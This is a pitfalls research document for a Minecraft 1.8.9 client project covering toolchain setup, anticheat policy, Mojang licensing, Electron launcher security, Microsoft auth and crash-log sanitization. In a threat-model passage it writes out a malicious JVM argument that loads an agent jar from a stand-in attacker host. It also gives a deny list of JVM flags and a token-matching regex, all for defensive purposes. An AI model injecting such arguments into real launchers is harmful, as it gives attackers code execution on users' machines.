# Pitfalls Research

**Domain:** Lunar-class Minecraft 1.8.9 client (Electron launcher + Forge mod + MS auth + anticheat-safe QoL features)
**Researched:** 2026-04-20
**Confidence:** HIGH for toolchain / anticheat / legal (official sources + concrete community evidence); MEDIUM for FPS internals (Patcher's source is the reference, but Mojang 1.8.9 internals are community-documented, not officially); MEDIUM for MSAL specifics (Minecraft's MS auth chain is community-documented via wiki.vg/minecraft.wiki)

Scope note: This document is project-specific and 1.8.9-specific. Generic Electron "don't enable nodeIntegration" advice is only included where it has a concrete twist for this project (spawning a JVM with user-controlled args).

---

## Critical Pitfalls

### Pitfall 1: Starting the Forge 1.8.9 build with a modern Gradle and fighting it for a week

**What goes wrong:**
Developer opens a fresh project, pulls a recent `gradle-wrapper.properties` (e.g. Gradle 7.4 or 8.x), and tries to apply `net.minecraftforge.gradle.forge`. Build fails with cryptic errors: `Plugin [id: 'net.minecraftforge.gradle.forge'...] was not found`, `Configuration with name 'compile' not found`, or `:fixMcSources` failures. Days disappear chasing a toolchain mismatch instead of building the mod.

**Why it happens:**
ForgeGradle for 1.8.9 was written against Gradle 2.x and uses the now-removed `compile` configuration. The old ForgeGradle Maven host (`files.minecraftforge.net`) is flaky, and `com.github.asbyth:ForgeGradle` fork references rely on JitPack being in good mood. Modern Gradle deprecated the API that 1.8.9 ForgeGradle depends on. Mixing a modern `settings.gradle`, a newer JDK, and an old ForgeGradle is a silent combinatorial disaster.

**How to avoid:**
- Start from a known-good 1.8.9 Mixin template (e.g. `manuthebyte/template-forge-mixin-1.8.9` or the templates Sk1er/EssentialGG publish) rather than building from scratch.
- Pin Gradle to whatever the template ships (typically 4.10.x for vanilla ForgeGradle 2.0.x, or a specific newer version if using `asbyth`/`XFactHD` forks that claim compatibility).
- Use **JDK 17 to run Gradle** (via `org.gradle.java.home` or toolchains) but set `sourceCompatibility = targetCompatibility = 1.8`. Gradle itself is fine on 17; the *compiler target* must stay Java 8.
- Never run `gradle wrapper --gradle-version <latest>` on a 1.8.9 project. Accept the "outdated" warning.
- Consider `ArchLoom` only if vanilla ForgeGradle actively fails — it's a real option but diverges from every 1.8.9 reference project online.

**Warning signs:**
- You're editing `build.gradle` before you've written any mod code.
- You've upgraded Gradle more than once in the first week.
- Stack Overflow results for your error are from 2016.

**Phase to address:** Phase 1 (game-client scaffold / Forge mod bootstrap). This is the first thing that must work; everything else depends on it.

**Severity:** SCHEDULE-BLOWING. Not project-ending, but will eat a week if unaddressed.

---

### Pitfall 2: Shipping a feature that trips Hypixel Watchdog and getting the user IP-banned

**What goes wrong:**
A seemingly-innocent feature (reach display that reads entity positions, freelook via camera decoupling, block-info overlay that reads NBT, ping-tag mod with a "bad" MODID) ends up on Hypixel's blacklist. Either the Forge handshake MODID string is flagged and the user is kicked, or the feature's packet-side fingerprint trips Watchdog heuristics and the account is banned. Watchdog bans are *IP bans* and permanent unless appealed.

**Why it happens:**
Three distinct detection surfaces that devs conflate:
1. **Forge mod-list handshake** — Forge sends every MODID to the server on login. Hypixel blacklists specific MODID strings (e.g. `perspectivemod`, `djperspectivemod` for freelook variants). Your mod's MODID is effectively public.
2. **Behavioral detection (Watchdog)** — reach extension, aimbot patterns, and fastclick detection are *behavioral*, not mod-list-based. Watchdog watches combat packets and attack cadence.
3. **Policy blacklist** — Hypixel publishes an "allowed modifications" policy. Reach display, freelook, health-indicator/distance overlays, and armor-status-mods-that-read-enemy-NBT are explicitly forbidden regardless of implementation. The reach-display ban caused "a lot of false bans" historically and Hypixel still clamps reach ~3.3.

**How to avoid:**
- **Anticheat-safety review is a MANDATORY phase gate**, not a code-review checklist item. Every feature gets a yes/no signoff before merging.
- **Forbid at the architecture level** (not at the code level): no packet inspection, no packet modification, no physics changes, no input automation, no reading entity NBT for display, no rendering that "knows about" other players' state beyond what vanilla renders.
- Keystrokes / CPS / FPS-counter are the community-accepted safe-list — stay inside that envelope. Reference Sk1er's Keystrokes and CPS Mod for precedent. Do NOT add right-click-autoclicker "helpers."
- **MODID strategy:** Use a generic, unmemorable MODID (e.g. `wiiwho`), NOT a name that describes what it does (never `reachdisplay`, never `freelook`, never `autoclicker`). Don't include user-visible mod names in the handshake string.
- **Test on a throwaway account first.** Every release cycle, install it on an alt, play 2 hours on Hypixel Bedwars + Skywars, confirm no kick / no flag. Only then release.
- Document every feature in a living `ANTICHEAT-SAFETY.md` — if it isn't explicitly listed as reviewed, it isn't allowed.

**Warning signs:**
- Any conversation about "what if we just showed reach subtly..."
- Any feature that reads *other players'* state (not just the local client's).
- A feature idea that starts with "Lunar does it, so it's safe" — Lunar has a direct relationship with Hypixel and special-cased allowances. You do not.
- Any mention of packet-level anything in feature design.

**Phase to address:** Every phase that ships an in-game feature. The Phase 1 "QoL HUD" milestone must establish the anticheat-review process BEFORE the first HUD ships.

**Severity:** PROJECT-ENDING. One Watchdog ban on the owner's account destroys trust in the client. Wider ban waves kill the small-group distribution model entirely.

---

### Pitfall 3: Monetizing or packaging anything that touches Mojang's copyright

**What goes wrong:**
Project adds a "pro tier" for cosmetics, bundles a vanilla 1.8.9 jar in the installer "for convenience," or ships a cosmetic that re-uses Mojang textures (a modified Steve skin as a cape). Mojang issues a cease & desist. Project is forced to rip features out or shut down entirely.

**Why it happens:**
The Mojang EULA has three distinct rules that devs confuse:
1. **No redistribution of Minecraft assets.** All game downloads must come from Mojang's official source. Launchers that bundle the jar are in violation even if "just for convenience."
2. **Mods may be monetized ONLY if they don't contain substantial Mojang copyrightable code/content.** Cosmetics that re-use Mojang textures or vanilla models-as-base = substantial content = can't monetize.
3. **Launchers can't look "too official."** If your launcher brand or UI invites confusion with the official Minecraft Launcher, Mojang's usage guidelines let them require changes.

Separately: Microsoft/Mojang reserve the right to revoke API access if a client is deemed to violate policy. Not a legal sword but a product sword.

**How to avoid:**
- **Launcher downloads jars from Mojang's manifest at runtime, always.** Never package the vanilla jar. This is already in scope — enforce with a CI check that fails the build if any `.jar` with Mojang-looking bytes is in `dist/`.
- **Any future monetization sells our code/assets only.** Capes designed from scratch by us, cosmetic models we own, mod features we wrote — yes. Anything derived from Mojang skins/textures/models — no.
- **Brand distance:** Name + logo + installer chrome must be visibly distinct from the official Minecraft Launcher. "WiiWho Client" is fine; any UI that apes the Mojang launcher's green grass-block branding is not.
- **No public release without a LICENSE file.** Even personal-use v0.1 benefits from one; public release mandates it. (Project has this as an open question — resolve before any public push.)
- Reference the cleanest precedent: Lunar's own terms are a useful checkpoint — their client downloads Mojang jars on demand and their cosmetics are Lunar-original art.

**Warning signs:**
- "Let's just include the jar to make installs faster."
- "Can we base this cape on the vanilla cape texture?"
- Any logo-design conversation that references the grass block.
- "Mojang probably won't notice" — they will, eventually.

**Phase to address:** Phase 0 (pre-code / legal review) and Phase 2 (launcher jar-download flow). Enforce in every cosmetics phase thereafter.

**Severity:** PROJECT-ENDING. A Mojang C&D is unlikely at hobbyist scale but guaranteed if the project ever gets real traction while violating these rules. The ones that scale slowly (monetizing Mojang-derived assets) are the ones that explode later — much cheaper to get right at Phase 0.

---

### Pitfall 4: Mixin version incompatibility and @Redirect conflicts producing mystery crashes

**What goes wrong:**
Mod works in dev with only our Mixins loaded. User installs it alongside Patcher / Optifine / another QoL mod in the same modpack. Game crashes on launch with a `MixinApplyError`, `InvalidInjectionException`, or silently, the Mixin fails to apply and the feature simply doesn't work. Users blame our mod for crashes caused by a Mixin priority collision.

**Why it happens:**
Forge 1.8.9 has no built-in Mixin loader — devs integrate Mixin via a coremod / Mixin bootstrap. The ecosystem has three mutually-incompatible Mixin versions in the wild (0.7.x, 0.8.x, 0.8.5+), loaded by different mods. Two mods bundling different Mixin versions fight to initialize first. When multiple mods `@Redirect` the same method, the lower-priority `@Redirect` is silently skipped — the mod appears to "not do anything" without an error. `@Inject` collisions can throw at apply time. Forge's own coremod system exists parallel to Mixin, and coremod + Mixin interaction on 1.8.9 is genuinely fragile.

**How to avoid:**
- **Pick ONE Mixin version for the project and pin it.** Target the version Patcher/Essential uses (currently 0.8.x as of the ecosystem-standard forks) so we coexist with the dominant 1.8.9 Mixin users.
- **Use a known-good Mixin bootstrap**, not a hand-rolled coremod. Reference `manuthebyte/template-forge-mixin-1.8.9` or vendor the SpongePowered MixinBootstrap approach used by MixinBooter/UniMixins ecosystem.
- **Rule: Mixin for what Forge events can't reach. Forge events for everything else.** If a feature can be done via Forge's event bus, don't Mixin. Fewer Mixins = fewer conflict surfaces.
- **Always set `priority` explicitly on Mixin classes** — don't rely on default. Pick a middle-of-the-road priority (1000, matching Forge default) for non-critical patches, so other mods can override when needed.
- **Prefer `@Inject` at `HEAD`/`RETURN` with `cancellable = false`** over `@Redirect`. Redirect conflicts are silent; Inject failures are loud.
- **Compatibility test matrix:** Before each release, launch with Patcher + Optifine + our mod installed together. This is the canonical 1.8.9 PvP loadout — if we break it, we break our audience.

**Warning signs:**
- Feature works in dev, doesn't work when installed as a jar. (Classic signal: dev environment has Mixin configured differently than prod.)
- User crash report mentions `org.spongepowered.asm.mixin`.
- More than ~10 Mixin classes in the project — you're probably using Mixin where Forge events would work.
- Anything `@Overwrite` — almost never the right answer on 1.8.9.

**Phase to address:** Phase 1 (mod scaffold — set up Mixin correctly from day one). Verification phase before each release.

**Severity:** SCHEDULE-BLOWING. Crashes are debuggable; silent Mixin-skips are the actual killer because they look like application bugs. Budget debugging time on first integration with Patcher/Optifine.

---

### Pitfall 5: Electron launcher spawning a JVM with user-controlled args is a remote-code-execution vector

**What goes wrong:**
Launcher accepts JVM args from a "custom args" UI field OR from a remote config OR from a URL-protocol handler (`wiiwho://launch?args=...`). An attacker crafts a link that appends `-javaagent:http://evil.com/pwn.jar` or `-cp evil.jar:minecraft.jar com.evil.Main` and gets code execution on the user's machine the next time the launcher runs. Even worse: renderer process has `nodeIntegration: true`, an XSS in the renderer (from cosmetics preview, server-list motd rendering, crash-report viewer) calls `child_process.spawn` directly.

**Why it happens:**
Electron's default security posture is permissive if you don't explicitly lock it down. Spawning `java` with user-mutable arguments is exactly the capability attackers look for. A launcher "custom arguments" field is a staple feature in the Minecraft-launcher space (Optifine, MultiMC, Prism all have it) so devs copy the pattern without threat-modeling it. IPC from renderer to main is often exposed as "just run this command" without allowlisting.

**How to avoid:**
- **Launcher renderer runs with `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`.** Non-negotiable. These are the Electron-recommended defaults for 2026 and enforced by default in Electron 28+.
- **Preload script exposes a narrow, typed IPC surface** via `contextBridge.exposeInMainWorld`. The renderer cannot spawn processes directly — it calls `launch(profile)` where `profile` is an opaque ID the main process looks up against its own allow-list.
- **JVM args are NEVER a raw string taken from the UI.** Expose specific toggles (heap size = slider with min/max, GC flag = enum, JVM path = auto-detected bundled JRE). If a "custom args" power-user field is ever added, hard-allowlist flags (only `-X`, `-D`, deny `-javaagent`, `-cp`, `-agentpath`, `-agentlib`).
- **No URL-protocol handler in v0.1.** Defer the `wiiwho://` scheme entirely; it's a phishing vector until the launcher is mature.
- **CSP on the renderer** with `default-src 'self'`, no `unsafe-inline`, no remote script sources. React server-renders or uses `dangerouslySetInnerHTML` never with server-supplied content.
- **Auto-update trust chain:** Whenever auto-update arrives (v0.2), require signed update manifests — not just HTTPS. electron-builder's default auto-update uses HTTPS + public-key signature verification; use that, don't roll your own.

**Warning signs:**
- `nodeIntegration: true` anywhere in BrowserWindow config.
- Any IPC handler that takes a string and passes it to `spawn`, `exec`, or `fork`.
- A "Custom JVM Arguments" text input in the UI in v0.1.
- Reading crash reports with `dangerouslySetInnerHTML`.
- Any `mailto://`, `file://`, or custom protocol handler registered before it's been threat-modeled.

**Phase to address:** Phase 2 (launcher scaffold / jar download + launch) and every phase touching the launcher IPC surface. Security review before the first public share.

**Severity:** PROJECT-ENDING in a reputational sense. A single RCE in a Minecraft client gets posted on r/minecraft and HackerNews the same day. Even pre-public v0.1 matters — the owner's dev machine is the first target.

---

### Pitfall 6: Microsoft auth refresh-token handling breaks silently and everyone gets logged out

**What goes wrong:**
User signs in via device code flow on day 1. Two weeks later, the launcher can't refresh and forces every user to sign in again with a fresh device code. Or worse: refresh tokens are stored in plaintext JSON next to the install, any malware on the user's box grabs them and takes over Minecraft accounts. Or: the token chain (MS OAuth → XBL → XSTS → Minecraft) fails at one step with a cryptic error and the launcher surfaces "login failed" with no diagnostics.

**Why it happens:**
Minecraft's MS auth is a *four-step token chain*: MS OAuth2 → Xbox Live (XBL) → Xbox Secure Token Service (XSTS) → Minecraft services. Each step has its own refresh semantics, rate limits, and failure modes. The XSTS step has user-facing error codes (`2148916233` = no Xbox account, `2148916238` = under-18 parental consent) that must be translated to UX, not dumped as numbers. MSAL's refresh token is for the MS OAuth step only — the XBL/XSTS tokens are shorter-lived and must be re-fetched from the MS token using a bespoke flow (wiki.vg documents this; MSAL doesn't). Many launchers cache the XBL/XSTS tokens and forget they expire on their own schedule. Storing tokens in plaintext JSON is the Minecraft-launcher-ecosystem default (see `launcher_accounts.json` in the official launcher) — this is actually a ladder-of-shame, not a model to copy.

**How to avoid:**
- **Use the OS keychain for refresh token storage.** `keytar` or Electron's built-in `safeStorage` API (backed by DPAPI on Windows, Keychain on macOS, libsecret on Linux). Never plaintext JSON. Never `localStorage`.
- **Cache the MS refresh token; re-derive XBL/XSTS/Minecraft tokens on every launch.** XBL tokens are short-lived (~24h) and the XSTS token depends on the current XBL — don't try to cache the downstream tokens, it creates inconsistent state.
- **Hard-translate XSTS error codes to user-facing messages.** The `2148916233` / `2148916238` / `2148916235` codes are well-documented on minecraft.wiki and wiki.vg — ship a lookup table, never surface the raw code.
- **Device code flow display is a UX hazard.** User sees a code, must open browser, paste code, authorize. Every step must be one-click or the flow dies halfway. Offer a "open browser for me" button; copy-to-clipboard the device code; show a spinner that polls every 5 seconds with exponential backoff (Microsoft's docs specify minimum 5-second poll interval).
- **Handle the "refresh token expired" path explicitly.** After ~90 days of inactivity, MS refresh tokens die. Detect the specific error (`invalid_grant`) and gracefully re-prompt device-code instead of looping with a cryptic error.
- **Register a real Azure AD app** with the right redirect URI (public-client for device code flow). Don't use someone else's client ID scraped from another launcher — it WILL get revoked by Microsoft and break every user simultaneously.
- **Rate-limit awareness:** XBL Live auth rate-limits heavily. Don't retry aggressively on failure. Cap refresh attempts at 1 per minute per account.

**Warning signs:**
- Token cache is a JSON file in `%APPDATA%`.
- Login error UX is a generic "failed to log in, try again" — no diagnostic codes.
- The client ID in the Azure AD app config is copied from a StackOverflow post.
- No exponential backoff on the device-code polling loop.

**Phase to address:** Phase 2 (MS auth flow is one of the two pillars of v0.1, alongside launch flow).

**Severity:** SCHEDULE-BLOWING. Not project-ending, but a broken auth UX is the #1 reason users uninstall a custom launcher. Plus: a plaintext token leak becomes a support nightmare.

---

### Pitfall 7: "Beats Optifine" benchmark is unreproducible and the perf claim evaporates

**What goes wrong:**
Dev claims "we beat Optifine by 30%." Three users try it, one sees +50%, one sees +5%, one sees -10% (regression). Credibility collapses. Worse: a perf change that *averages* +20% ships with a rare tail-latency spike that causes a 1-frame hitch during PvP combat — exactly the scenario where frame timing matters most.

**Why it happens:**
Minecraft FPS is wildly variable. GPU driver / CPU / RAM clock / background processes / render distance / fog / shader pack / window size / Vsync / fullscreen-vs-windowed / thermal state all move the number by 20-50%. There is no industry-standard Minecraft benchmark scene. "FPS counter mod shows bigger number on my machine" is not evidence. Worse, many 1.8.9 optimizations (especially aggressive chunk culling / reduced animation tick / batched draws) trade average FPS for occasional stutters — catastrophic in PvP even if average is up.

**How to avoid:**
- **Define the benchmark artifact before writing optimizations.** Specific world seed, specific spawn coordinates, specific sunrise-lock (F3+T trick), specific render distance, specific view angle, fixed 120-second window. Commit this to `benchmarks/reference-scene.md`.
- **Record frametimes, not FPS.** FPS averages hide stutter. Use the `fps` frametime graph in F3 or a Mixin that samples Minecraft's `Timer` every frame and dumps to CSV. Report p50, p95, p99 frametimes.
- **Benchmark with Optifine + Patcher as the baseline**, not vanilla. Nobody plays 1.8.9 PvP on vanilla — the real comparison is against the Lunar/Optifine+Patcher stack.
- **Pin system profile per benchmark run.** CPU governor set to performance, Vsync off, fullscreen, no background Chrome, thermal-steady-state (run 60s warm-up). Document machine spec.
- **Require N=5 runs per configuration and report variance.** A perf claim without σ is not a perf claim.
- **Reject any optimization that improves p50 but regresses p99.** PvP only cares about the bad frames.
- **No "beats Optifine by X%" in user-facing copy until three separate machines confirm it on the reference scene.**

**Warning signs:**
- "I ran it and saw 300 FPS" — no methodology.
- FPS claim without frametime variance.
- Testing done only on the dev's machine.
- Optimization PR that doesn't include before/after numbers.
- Benchmark scene changes between runs.

**Phase to address:** Phase 3 (FPS performance work). Benchmark methodology must exist BEFORE the first optimization PR.

**Severity:** SCHEDULE-BLOWING plus reputation. "Beats Optifine" is core to the project's value prop — a false claim hurts more than no claim.

---

### Pitfall 8: Crash reports leak user PII (tokens, usernames, file paths) when shared

**What goes wrong:**
Launcher surfaces a crash report in the UI with a "copy to clipboard" button. User pastes into Discord asking for help. Crash report contains `accessToken`, Xbox Live token, Windows username embedded in file paths (`C:\Users\realname\...`), and the MS account email in the launch log. Token is still valid for days. Third party takes over the Minecraft account.

**Why it happens:**
Minecraft's launch command-line is logged by Forge's debug output. Both the `--accessToken` JVM arg and environment variable leaks end up in crash dumps. Windows file paths contain Windows usernames which are often real names. Electron's unhandled-exception stack traces include paths, environment variables, and command-line arguments. Developers think of "crash report" as a technical artifact, not a PII-bearing document.

**How to avoid:**
- **Sanitize crash reports before display.** Regex-strip any `accessToken=\S+`, any `--accessToken \S+`, any string matching `eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+` (JWT), and any environment variable values.
- **Replace Windows usernames in paths** with `<USER>` before display (`C:\Users\<USER>\...`). Apply same logic to macOS `/Users/...`.
- **Never ship the raw launch command to the UI.** Store internally, display a sanitized form. If "copy to clipboard" is offered, copy the sanitized form.
- **Never auto-upload crash reports in v0.1.** (Already out of scope.) When it arrives, require explicit user consent + show the sanitized payload before upload.
- **Treat the Windows username as PII.** This is genuinely surprising to devs from Linux/macOS backgrounds but Windows usernames are often `FirstLast` or `firstname.lastname`.

**Warning signs:**
- Crash viewer UI does `<pre>{rawStderr}</pre>` with no filtering.
- "Copy to clipboard" copies the same thing the user sees (which means whatever is in the log).
- Test user's name appears in a screenshot of the crash UI.

**Phase to address:** Phase 2 (crash log viewer is a v0.1 requirement). Sanitization must ship with the first crash-viewer version.

**Severity:** SCHEDULE-BLOWING (small-group) → PROJECT-ENDING (public release). At personal-use scale, a leaked token is a personal support issue. At any public scale, this becomes a security disclosure.

---

### Pitfall 9: macOS Gatekeeper blocks the unsigned app entirely, even for friends

**What goes wrong:**
Owner ships a v0.1 macOS build to three friends. Two of them double-click, macOS says "WiiWho Client cannot be opened because it is from an unidentified developer" with only a Cancel button. One of the friends doesn't know the right-click-Open workaround. Friend gives up; project loses momentum.

**Why it happens:**
Since macOS 10.15 (Catalina), Apple requires notarization for third-party apps, not just code signing. A bundled JRE triggers additional checks — unsigned JVM binaries inside the app bundle cause notarization to fail OR Gatekeeper to quarantine at runtime. The "ad-hoc signed" default from electron-builder isn't sufficient. For a macOS-target in v0.1, "no signing" is genuinely a hard UX wall, not just a warning.

**How to avoid:**
- **Decide early:** Apple Developer Program ($99/year) is the only sanctioned path for non-App-Store macOS distribution that "just works." Without it, every user must right-click-Open on first launch AND grant Gatekeeper an override for the bundled JVM binaries.
- If staying unsigned in v0.1 (which PROJECT.md endorses), **ship an explicit first-launch guide** — README + launcher-download page must describe the right-click-Open workaround in plain language + screenshots.
- **Bundle a JRE that's already codesigned** (Azul Zulu, Amazon Corretto, or Adoptium Temurin ship signed macOS binaries). Using an unsigned custom-stripped JRE kills Gatekeeper compliance even if the Electron app is signed.
- **Plan signing as a Phase-4 capability.** Don't retrofit signing+notarization at the end of a milestone; the `@electron/notarize` integration + hardened runtime + entitlements + bundled-JRE signing is a 1-2 day task, not a 1-hour task.
- **Test on a clean macOS machine.** The dev's machine has whatever signing state is in its dev history — that is not the user experience. Use a fresh VM or a second account.

**Warning signs:**
- Dev machine launches the built app fine; test user can't.
- "Just tell them to right-click" is the documented solution.
- Bundled JRE is stripped/custom rather than a standard distribution.

**Phase to address:** Phase 4 (packaging + distribution). Anticipate with clear first-launch docs in Phase 2.

**Severity:** SCHEDULE-BLOWING. Not fatal to personal-use v0.1 since PROJECT.md accepts no-signing, but make sure the cost is genuinely paid — "friends can't install it" is a de-facto Mac drop.

---

## Moderate Pitfalls

### Pitfall 10: Config file format drift breaks user settings on update

**What goes wrong:** User on v0.1 has a `config.json` with their HUD positions. v0.2 adds a field, renames another. Launcher crashes on load or silently resets all settings.

**How to avoid:**
- Embed a `configVersion` integer in the config schema from day one.
- Ship explicit migrations between versions (`if config.version === 1, transform to v2`).
- Never rename a field — only add and deprecate.
- Round-trip unknown keys (preserve forward-compat fields on write).

**Phase to address:** Phase 2 (first config file is written).

---

### Pitfall 11: Over-allocating JVM heap kills 1.8.9 performance

**What goes wrong:** User slides the RAM allocator to 16GB thinking "more is better." 1.8.9 with CMS GC and 16GB heap exhibits multi-second GC pauses.

**How to avoke:**
- Cap the slider at 4GB for 1.8.9 (4G is the practical ceiling for Java 8 / CMS).
- Default to 2GB.
- Include a short "Why not more?" tooltip explaining GC pause tradeoffs.
- Ship G1GC-tuned JVM args as default (`-XX:+UseG1GC -XX:MaxGCPauseMillis=50`).

**Phase to address:** Phase 2 (RAM slider UI).

---

### Pitfall 12: ModID string collision with existing 1.8.9 mods

**What goes wrong:** Chosen MODID already exists in the wild; when both mods are loaded, Forge refuses to start.

**How to avoid:**
- Check CurseForge + Modrinth + Hypixel mod list for MODID collisions before picking.
- Namespace the ID (e.g. `wiiwho_client` not `wiiwho`).
- Document the MODID choice in `ARCHITECTURE.md`.

**Phase to address:** Phase 1 (mod scaffold).

---

### Pitfall 13: MCP mappings version drift

**What goes wrong:** Dev uses `mcp_snapshot_20160301` in dev but the Forge MDK template defaults to `stable_20`. Names compile-link but crash at runtime because snapshot mappings renamed a field.

**How to avoid:**
- **Use `stable_22` for 1.8.9** — the canonical stable mapping set.
- Never mix stable + snapshot in the same project.
- Pin the mapping version in `build.gradle` and commit to git.

**Phase to address:** Phase 1 (Forge scaffold).

---

### Pitfall 14: Optifine compatibility — break it and lose half the user base

**What goes wrong:** 1.8.9 PvP users near-universally run Optifine. Our Mixin patches a method Optifine also patches. Users choose Optifine, uninstall us.

**How to avoid:**
- **Optifine coexistence is a requirement, not a nice-to-have.** Test matrix must include Optifine.
- If our patch conflicts, either change approach or gate our patch with "only if Optifine isn't present."
- Don't try to replace Optifine features in v0.1 — augment.

**Phase to address:** Phase 3 (FPS work — this is where conflicts emerge).

---

### Pitfall 15: Fullscreen vs windowed perf regressions

**What goes wrong:** FPS looks great in windowed mode; fullscreen is stuttery. User perceives the client as broken.

**How to avoid:**
- Test both modes in the benchmark suite.
- Know that LWJGL 2 (which 1.8.9 uses) has different display paths for windowed vs fullscreen.
- If fullscreen regresses, investigate "fake fullscreen" / borderless-window as a default.

**Phase to address:** Phase 3 (FPS work).

---

### Pitfall 16: Electron version lockstep with Node.js ABI for native modules

**What goes wrong:** `keytar` (or any native Node module) is compiled for Node 18 ABI; Electron 28 ships Node 20 ABI. Runtime crash on any keychain access.

**How to avoid:**
- Use `@electron/rebuild` in the build pipeline.
- Pin Electron version in `package.json` and don't upgrade during a milestone.
- Prefer Electron's built-in `safeStorage` API over `keytar` — no native-module ABI concern.

**Phase to address:** Phase 2 (launcher scaffold).

---

## Minor Pitfalls

### Pitfall 17: Log files grow unbounded

**What goes wrong:** `logs/latest.log` reaches hundreds of MB after weeks of play. Disk fills up.
**How to avoid:** Rotate logs daily; cap at 30 days / 100MB total. Use a standard rotator not a custom one.
**Phase to address:** Phase 2 (launch flow).

### Pitfall 18: Installer doesn't clean up old versions on upgrade

**What goes wrong:** Every version leaves an orphaned `resources/app.asar` or bundled JRE in a versioned folder. 20 versions later, 5GB of disk.
**How to avoid:** electron-builder's NSIS (Windows) and DMG (macOS) handle this, but bundled JRE in `extraResources` might not — verify with a multi-install test.
**Phase to address:** Phase 4 (packaging).

### Pitfall 19: Cosmetics placeholder commits real assets that can't ship publicly

**What goes wrong:** v0.1 ships with a placeholder cape that's a modified Mojang texture or a copyrighted-elsewhere image. Can't distribute.
**How to avoid:** Placeholder cape must be either our original art OR a CC0/public-domain image with provenance documented.
**Phase to address:** Phase 3 (cosmetic pipeline).

### Pitfall 20: No versioned API between launcher and mod

**What goes wrong:** Launcher v0.2 passes a new flag the v0.1 mod doesn't understand. Mod crashes or silently ignores the flag.
**How to avoid:** Define a stable launcher→mod handoff (JVM arg, file, or localhost port) with an explicit protocol version byte. Refuse to launch if versions don't match.
**Phase to address:** Phase 2 (launch flow).

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Plaintext refresh token in JSON | Skip OS-keychain integration (~1 day saved) | Token theft on any malware; breaks public-release trust story | NEVER — `safeStorage` is 1 hour of work |
| `nodeIntegration: true` to "just make it work" | Prototype speed | Full-RCE surface; retrofit is painful because all renderer code uses Node APIs | Only if the renderer loads zero remote content ever; extremely narrow |
| Bundle the 1.8.9 jar to skip download step | Faster first-launch | Mojang EULA violation; legal risk | NEVER |
| Copy another launcher's Azure AD client ID | Skip Azure setup | Microsoft revokes; every user breaks simultaneously | NEVER — register your own |
| `@Overwrite` in a Mixin instead of `@Inject` | Easier to write | Breaks every other mod patching that method | NEVER in v0.1 — use `@Inject` |
| Skip the benchmark scene definition | Ship perf claim sooner | Every future optimization lacks baseline | Never for the "beats Optifine" claim; fine for internal exploration |
| No MODID namespacing | One-char shorter | Collision with existing mod = Forge won't start | Never — always namespace |
| Un-rotated logs | One less dependency | Disk fill bug reports in 6 months | Never — cost is tiny |
| Unsigned macOS build | Skip $99/year + notarization setup | Friends can't install without right-click workaround | Acceptable for personal-use v0.1; document the workaround loudly |
| Custom crash-report regex instead of using `mclo.gs`-style library | No dep added | Misses tokens of new shapes in future | Acceptable if the regex is reviewed against known Minecraft token formats |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Microsoft OAuth (MSAL) | Skipping Xbox Live → XSTS → Minecraft token chain; assuming MSAL handles everything | Implement the full 4-step chain per minecraft.wiki / wiki.vg. MSAL only handles step 1 (MS OAuth); downstream tokens are bespoke |
| Hypixel (Forge handshake) | Using a descriptive MODID like `reachdisplay` | Generic namespaced MODID (`wiiwho_client`), never feature-describing |
| Hypixel (behavioral) | Assuming "our feature doesn't modify packets, so it's safe" | Review against the published allowed-modifications policy AND test on an alt first |
| Mojang jar download | Hardcoding the 1.8.9 jar URL | Fetch the launcher manifest; resolve 1.8.9 entry; verify SHA-1 of the downloaded jar against the manifest |
| Forge (coremod + Mixin) | Registering our own coremod alongside Mixin | Use Mixin via a known bootstrap; let the bootstrap handle coremod registration |
| Optifine | Not testing Optifine coexistence | Test matrix: our mod alone / + Optifine / + Patcher / all three |
| electron-builder (bundled JRE) | JRE inside `app.asar` (won't execute on macOS) | JRE in `extraResources` or `asarUnpack` explicitly; verify JRE is executable post-install |
| electron-builder (auto-update) | Custom HTTP-fetch update code | Use `electron-updater` with signed manifests; don't roll your own |
| Electron `safeStorage` | Assuming it's available before `app.isReady()` | Check `app.whenReady()` + `safeStorage.isEncryptionAvailable()` before any token access |
| JVM subprocess | Launching without capturing stderr | Capture both stdout and stderr; sanitize before display (tokens!) |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Mixin hotpath allocation | p99 frametime regresses while p50 improves | Profile allocations in the patched method; prefer field caching over per-call allocation | Any combat scenario (1.8.9 PvP is allocation-sensitive) |
| Over-aggressive chunk culling | Visible pop-in; players "appear from nowhere" (PvP catastrophe) | Never cull entities, only block chunks; test on an open PvP map | Mid-range render distance (8-12) in combat |
| Chunk rebuild on main thread | 100-500ms hitches when crossing chunk borders | Follow Patcher's pattern: rebuilds on worker thread, synchronize only the final VBO upload | Any movement-heavy scenario |
| "Optimize" by batching draws that weren't slow | Breaks Optifine's custom renderers; FPS drops | Profile first; only patch what's actually a hotspot | Users with Optifine (i.e. ~all of them) |
| GC tuning that helps throughput but hurts pause times | Combat stutters even though average FPS is up | Use G1GC with `MaxGCPauseMillis=50`; never use Parallel GC for interactive workloads | PvP combat specifically |
| RAM allocation > 4GB | GC pauses measurable as stutters every few minutes | Cap slider at 4GB; document in UI | Any user who cranks the slider |
| Starting the launcher is slow | Electron boot + MSAL check + manifest fetch serial | Parallelize: manifest fetch + MSAL refresh concurrently; show UI immediately, hydrate async | Cold start on slow disks |
| Log I/O in the render loop | Microstutters correlated with log events | No logging on the hot path; use ring buffer, flush async | Any non-trivial frame count |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Plaintext token storage | Token theft via any malware → account takeover | OS-keychain via `safeStorage` or `keytar` |
| `nodeIntegration: true` in renderer | XSS → full RCE on user's box | `contextIsolation: true, nodeIntegration: false, sandbox: true` |
| User-controllable JVM args | Local attacker escalates to arbitrary code execution | Allowlist flags; reject `-javaagent`, `-cp`, `-agent*` |
| Custom URL protocol handler (`wiiwho://`) with arg parsing | Drive-by code execution via malicious link | Defer to v0.2+; when shipped, require explicit confirmation for any launch-affecting parameter |
| Crash reports displayed raw | Token / PII leak when user shares crash | Regex-sanitize before display and before copy-to-clipboard |
| Unverified mod jar download | Supply-chain compromise | SHA-256 verify any runtime-downloaded jar against a pinned manifest we sign |
| HTTP (not HTTPS) for any auth-adjacent call | MITM credential theft | HTTPS everywhere; enforce at the fetch layer, no `http://` allowed |
